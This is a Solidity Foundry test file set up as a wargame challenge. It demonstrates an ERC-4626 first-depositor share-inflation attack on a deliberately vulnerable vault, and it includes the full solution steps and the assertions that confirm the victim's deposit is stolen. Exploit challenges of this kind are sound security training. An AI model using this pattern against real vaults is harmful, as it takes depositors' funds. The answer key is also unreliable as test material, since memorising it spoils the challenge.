// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// WARGAME CHALLENGE 2 — Vault share inflation (ERC-4626 first-depositor attack)
//
// You go first into an empty TinyVault. A victim is about to deposit 10,000 tokens. Arrange things so
// that the victim's deposit mints them ZERO shares and ends up belonging to you.
//
// To play: delete everything between the SOLUTION markers and write your own setup.
// Win: the victim gets 0 shares and your single share can redeem both deposits.

import {Test} from "forge-std/Test.sol";
import {TinyVault} from "../../src/ctf/VulnSystems.sol";
import {MockToken} from "../../src/common/ERC20.sol";

contract Challenge2_VaultInflation is Test {
    MockToken token;
    TinyVault vault;
    address player = makeAddr("player");
    address victim = makeAddr("victim");

    uint256 constant VICTIM_DEPOSIT = 10_000e18;

    function setUp() public {
        token = new MockToken("Token", "TKN", 18);
        vault = new TinyVault(token);
        token.mint(player, 10_000e18 + 1); // 1 wei to deposit, the rest to donate
        token.mint(victim, VICTIM_DEPOSIT);
    }

    function test_exploit() public {
        vm.startPrank(player);
        // ─────────────────────────────── SOLUTION ▼ (delete this and write your own) ───────────────────────────────
        token.approve(address(vault), type(uint256).max);
        vault.deposit(1); // you now own the only share
        token.transfer(address(vault), 10_000e18); // donate: inflate the share price
        // ─────────────────────────────── SOLUTION ▲ ───────────────────────────────
        vm.stopPrank();

        // the victim now deposits (this is the scenario, not part of your exploit)
        vm.startPrank(victim);
        token.approve(address(vault), type(uint256).max);
        uint256 victimShares = vault.deposit(VICTIM_DEPOSIT);
        vm.stopPrank();

        assertEq(victimShares, 0, "the victim should mint zero shares");
        assertEq(vault.shares(player), 1, "you should still hold the only share");
        assertGe(vault.totalAssets(), 20_000e18, "the vault holds both deposits");

        vm.prank(player);
        uint256 got = vault.redeem(1);
        assertGt(token.balanceOf(player), 19_000e18, "your one share redeems everything, including the victim's deposit");
        assertGe(got, 20_000e18);
    }
}
